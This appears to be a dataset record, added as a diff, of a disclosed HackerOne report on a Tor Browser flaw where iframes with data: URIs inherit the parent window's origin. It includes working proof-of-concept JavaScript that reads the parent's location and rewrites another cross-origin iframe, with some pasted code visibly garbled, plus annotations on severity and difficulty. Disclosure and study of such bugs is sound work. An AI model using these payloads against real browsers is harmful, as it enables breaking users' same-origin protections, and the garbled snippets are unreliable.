@@ -1,0 +1,38 @@
+{
+    "reported_to": "Tor",
+    "reported_by": "metnew ",
+    "title": "Tor Browser: iframe with `data:` uri  has access to parent window",
+    "content": "\nVersion:\n7.5.4 (based on Mozilla Firefox 52.8.0)\nTested with standard security slider. However, it's likely to be possible with a higher security level.\nSummary\nIn Tor Browser iframe with data:uri inherits the origin of parent window.\nThat leads to iframe has access to parent window.\nPoC\nIframe could access parent window's location\n<body>\n    <script>\n        let f = document.body.appendChild(document.createElement('iframe'))\n        f.src =\n            'data:text/html,' +\n            `<script>alert(parent.location)</scrip` + `t>` \n        // should throw \"SecurityError...\", instead `alert()` works\n    </script>\n</body>\niframe could access another iframe with src=data uri\n<body>\n    <script>\n\ng.src =\n'data:text/html,' + 'First iframe with data:uri'\nf.src =\n'data:text/html,' +\nSecond iframe with data:uri <script>alert(\"Iframe with data:uri could access another same-origin iframe with data:uri, first iframe location is: \" + parent.window.frames[0].location.href)</scr + ipt>\nCode 25 Bytes\n1    </script>\n2</body>\n3```\ndata:uri iframe could rewrite content of another cross-origin iframe via data:uri\n##### 127.0.0.1:5000/exploit.html\nCode 1.52 KiB\n1<body>\n2    <script>\n3        let g = document.body.appendChild(document.createElement('iframe'))\n4        let f = document.body.appendChild(document.createElement('iframe'))\n5\n6        g.src =\n7            'http://127.0.0.1:5001/5001.html'\n8\n9        g.onload = () => {\n10            f.src =\n11                'data:text/html,' +\n12                `Second iframe with data:uri \n13                <script>\n14                    if (!parent.window.frames[0][0]) {\n15                        console.log('This block called in the context of |Second iframe with data:uri|');\n16                        console.log('If first script sets parent.window.location to some valid value');\n17                        console.log('it removes parent.window.frames[0][0].location from the DOM');\n18                        console.log('Tor re-runs script in this cause, but in context of this window');\n19                        console.log('e.g. window with |Second iframe with data:uri| text');\n20                    } else {\n21                        parent.window.frames[0][0].location = \"data:text/html,5000 iframe rewrites  5001<script>\n22                        window.onload = () => {\n23                            console.log('This block called in the context of |5000 iframe rewrites 5001|');\n24                            parent.window.location = 'about:blank'\n25                        }\n26                        </scr\" + \"ipt>\";\n27                    }\n28                    \n29                </scr` + `ipt>`\n30        }\n31\n32    </script>\n33    <h4>we could rewrite data:uri in crossdomain windows</h4>\n34</body>\n##### 127.0.0.1:5001/5001.html\nCode 180 Bytes\n1<html>\n2\n3<body>\n4    <script>\n5        let y = document.body.appendChild(document.createElement('iframe'))\n6        y.src = 'data:text/html,datauri 5001'\n7    </script>\n8</body>\n9\n10</html>\nThe iframe from 5000 port could rewrite an iframe in a different origin, but it doesn't have access to \"parent\" at 5001 port, so direct UXSS is impossible.\nAlso, there is an interesting case described in PoC. Function in the iframe from port 5000 called twice in different contexts.\nExpected behavior\n### 1. In latest Chrome, Firefox, Safari iframe with data: uri has null origin and can't access parent window's location.\nPoC in Chrome/FF/Safari throws error:\nCode 237 Bytes\n1SecurityError: Blocked a frame with origin \"null\" from accessing a frame with origin \"http://127.0.0.1:5000\".  The frame requesting access has a protocol of \"data\", the frame being accessed has a protocol of \"http\". Protocols must match.\n### 2. iframe can't rewrite another iframe's content via data uri.\nSame as in the 1 case.\nCode 81 Bytes\n1SecurityError: Permission denied to access property \"href\" on cross-origin object\n### 3.\nFF\nCode 58 Bytes\n1NS_ERROR_DOM_PROP_ACCESS_DENIED: Access to property denied\nChrome/Safari\nCode 112 Bytes\n1Unsafe JavaScript attempt to initiate navigation for frame with URL...\n2SecurityError: The operation is insecure.\nImpact\nPartial SOP violation.\nDirect UXSS seems impossible, but described behavior opens a wide range of attack scenarios.\nAny malicious iframe src=data:uri could access parent\nAny malicious iframe src=data:uri could rewrite other frames's location (to data:uri too) in DOM using parent.window.frames\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "None"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1528329360,
+    "report_url": "https://hackerone.com/reports/358005",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Create an HTML page with an iframe that has a `data:` URI as its source."
+        ],
+        [
+            2,
+            "Use JavaScript within the `data:` URI iframe to attempt to access the parent window's location or manipulate other iframes."
+        ]
+    ],
+    "vuln_description": "In Tor Browser, an iframe with a `data:` URI inherits the origin of the parent window, allowing it to access and manipulate the parent window and other iframes, which violates the Same-Origin Policy (SOP). This can lead to various attack scenarios, including rewriting content of other iframes and accessing sensitive information.",
+    "reason": "The vulnerability involves understanding the behavior of `data:` URIs in iframes and how they interact with the parent window's origin. While the attack itself is straightforward once the behavior is known, discovering this interaction requires knowledge of how `data:` URIs are handled differently in Tor Browser compared to other browsers.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
